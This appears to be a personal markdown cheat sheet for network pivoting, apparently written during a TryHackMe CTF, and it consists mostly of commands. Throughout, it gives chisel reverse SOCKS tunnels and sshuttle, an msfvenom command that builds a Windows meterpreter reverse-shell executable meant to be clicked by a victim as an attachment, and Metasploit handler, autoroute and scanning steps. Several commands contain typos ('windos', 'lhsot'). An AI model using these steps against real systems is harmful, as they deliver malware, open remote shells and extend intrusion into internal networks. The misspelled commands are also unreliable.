# Pivoting

### Chisel

```bash
# From Kali
kali@kali:~/ctf/tryhackme/holo$ chisel server -p 8000 --reverse

# Download necessary platform binary for target i.e Linux adm64, Windows, etc.

# From Target
./chisel client 10.50.143.31:8000 R:socks

# And now use proxychains with port 1080 (default)
```

### sshuttle

> Will only work if SSH is running and will NOT work on Windows machines

```bash
# From Kali
sshuttle -r USER@MACHINE_IP 0.0.0.0/0
```

### Armitage

```bash
# Setup Meterpreter revere shell
msfvenom -p windows/meterpreter/reverse_tcp --platform windows --arch x86 -f exe LHOST=<IP> LPORT=<IP> -o winjan.exe
# From Armitage
# Add target host, select payload, windows, meterpreter, reverse_tcp, remove encoding, and update the port
# Now wait for a victim to click the malicious attachment winjan.exe
# Arimtage has detected and exploited it
# Right click on the target to select meterpreter, pivoting, setup, and see additional hosts
# We can now scan the new target(s). Select Hosts, MSFscans, and enter range
```

### Metasploit

```bash
msf > use exploit/multi/handler
msf > set payload windos/meterpreter/reverse_tcp
msf > set lhsot
msf > set lport
msf > exploit
# Now execute the winjan.exe file from the target like with Armitage
# We now have a meterpreter reverse shell and can check the network configuration
meterpreter > shell
C:\tools>ipconfig
exit
meterpreter > background
msf exploit(multi/handler) > use post/multi/manage/autoroute
msf post(multi/manage/autoroute) > set subnet 10.1.1.0
msf post(multi/manage/autoroute) > set session 1
msf post(multi/manage/autoroute) > exploit
# We can now pivot by scanning one of the new targets
msf auxiliary(scanner/ssh/ssh_version) > set rhosts 10.1.1.5
msf auxiliary(scanner/ssh/ssh_version) > exploit
```
